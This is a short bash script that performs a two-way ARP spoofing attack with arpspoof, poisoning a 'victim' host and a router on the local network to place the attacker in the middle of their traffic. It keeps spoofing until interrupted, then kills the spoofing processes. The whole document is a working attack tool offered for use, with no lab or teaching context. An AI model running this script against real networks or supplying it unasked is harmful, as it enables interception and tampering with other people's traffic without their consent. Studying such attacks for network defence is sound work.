#!/bin/bash
# $1 --> VICTIM IP
# $2 --> SERVER IP

echo "Spoofing victim ($1) to router ($2)"
echo "sudo arpspoof -i wlp2s0 -t $1 $2"
(sudo arpspoof -i wlp2s0 -t $1 $2 &) > /dev/null 2>&1
SPOOFING_VICTIM_PID=$!
echo ""

echo "Spoofing router ($2) to victim ($1)"
echo "sudo arpspoof -i wlp2s0 -t $2 $1"
(sudo arpspoof -i wlp2s0 -t $2 $1 &) > /dev/null 2>&1
SPOOFING_ROUTER_PID=$!
echo ""


cleanup () {
  echo "Killing process"
  kill -9 $SPOOFING_VICTIM_PID > /dev/null 2>&1
  kill -9 $SPOOFING_ROUTER_PID > /dev/null 2>&1

  exit 0
}

trap cleanup SIGINT SIGTERM

while [ 1 ]
do
    sleep 5 &
    wait $!
    echo "Spoofing..."
done
